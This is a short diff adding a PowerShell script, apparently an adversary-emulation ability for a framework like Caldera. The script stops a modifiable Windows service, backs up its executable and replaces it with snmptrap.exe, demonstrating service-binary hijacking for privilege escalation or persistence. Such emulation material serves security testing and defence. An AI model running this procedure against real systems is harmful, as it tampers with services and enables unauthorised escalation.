@@ -1,0 +1,6 @@
+$s = Get-Service -Name #{host.service.modifiable};
+if ($s.status -ne 'Stopped') { Stop-Service $s };
+$exe = (Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\#{host.service.modifiable}").ImagePath.split()[0];
+$path = (Resolve-Path $exe).Path;
+Copy-Item -Path $path -Destination ($path + ".saved");
+Copy-Item -Path "C:\Windows\System32\snmptrap.exe" -Destination $path
